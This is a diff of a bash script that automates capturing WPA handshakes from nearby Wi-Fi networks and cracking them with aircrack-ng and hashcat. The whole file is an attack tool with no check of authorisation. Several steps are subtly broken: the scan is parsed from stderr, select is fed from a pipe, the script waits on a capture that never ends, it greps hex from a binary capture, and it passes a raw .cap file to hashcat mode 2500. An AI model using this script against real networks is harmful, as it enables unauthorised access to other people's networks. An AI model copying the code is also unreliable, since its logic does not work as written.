@@ -1,65 +1,72 @@
 #!/bin/bash
 
 # Check if running as root
-if [ "$EUID" -ne 0 ]
-  then echo "Please run as root"
-  exit
+if [ "$(id -u)" != "0" ]; then
+  echo "Please run as root"
+  exit 1
 fi
 
-# Check if airmon-ng is installed
-if ! command -v airmon-ng &> /dev/null
-then
-    echo "airmon-ng could not be found. Please install aircrack-ng."
-    exit
-fi
-
-# Check if hashcat is installed
-if ! command -v hashcat &> /dev/null
-then
-    echo "hashcat could not be found. Please install hashcat."
-    exit
+# Check if aircrack-ng and hashcat are installed
+if ! command -v airmon-ng &> /dev/null || ! command -v hashcat &> /dev/null; then
+    echo "aircrack-ng or hashcat is not installed. Please install them."
+    exit 1
 fi
 
 # Check if wireless interface is provided
-if [ -z "$1" ]
-then
+if [ -z "$1" ]; then
     echo "Please provide a wireless interface name as argument (e.g. wlan0)"
-    exit
+    exit 1
 fi
 
-interface=$1
+interface="$1"
 
 # Put wireless interface into monitor mode
 airmon-ng start "$interface"
 
-# Start capturing handshakes
-airodump-ng mon0
+# Scan for access points
+echo "Scanning for access points..."
+aps=$(airodump-ng mon0 --output-format csv --write /dev/shm/scan 2>&1 >/dev/null | awk -F ',' 'NR > 6 {print $1, $4, $6}')
 
-# Ask user for BSSID and channel to target
-echo "Please enter the BSSID and channel to target (e.g. XX:XX:XX:XX:XX:XX 6): "
-read -r bssid channel
+# Check if any access points were found
+if [ -z "$aps" ]; then
+    echo "No access points found. Exiting."
+    airmon-ng stop mon0
+    exit 1
+fi
 
-# Set channel for capture
-iwconfig mon0 channel "$channel"
+# Display list of access points and prompt user to choose one
+echo "Select an access point:"
+PS3='> '
+while IFS= read -r line; do echo "$line"; done <<< "$aps" | select ap; do
+    if [ -n "$ap" ]; then
+        bssid=$(echo "$ap" | awk '{print $1}')
+        channel=$(echo "$ap" | awk '{print $2}')
+        break
+    fi
+done
 
 # Start capturing handshakes for target network
-airodump-ng -c "$channel" --bssid "$bssid" -w handshake mon0
+echo "Capturing handshakes for $bssid (channel $channel)..."
+airodump-ng -c "$channel" --bssid "$bssid" -w handshake mon0 &
 
-# Once handshake is captured, stop capturing and stop monitor mode
-airmon-ng stop mon0
+# Wait for handshake capture to complete
+wait
 
 # Extract hash from handshake file
-hash=$(grep -oP '([0-9A-Fa-f]{2}:){15}[0-9A-Fa-f]{2}' handshake*.cap | head -n 1)
+hash=$(grep -oP '([0-9A-Fa-f]{2}:){15}[0-9A-Fa-f]{2}' handshake-01.cap | head -n 1)
 
-if [ -z "$hash" ]
-then
+if [ -z "$hash" ]; then
     echo "No hash found in handshake file. Exiting."
-    exit
+    airmon-ng stop mon0
+    exit 1
 fi
 
 # Ask user for wordlist to use for cracking
-echo "Please enter the path to the wordlist to use for cracking: "
-read -r wordlist
+read -r -p "Please enter the path to the wordlist to use for cracking: " wordlist
 
 # Crack the hash using hashcat
-hashcat -m 2500 handshake*.cap "$wordlist"
+echo "Cracking hash..."
+hashcat -m 2500 handshake-01.cap "$wordlist"
+
+# Stop monitor mode
+airmon-ng stop mon0
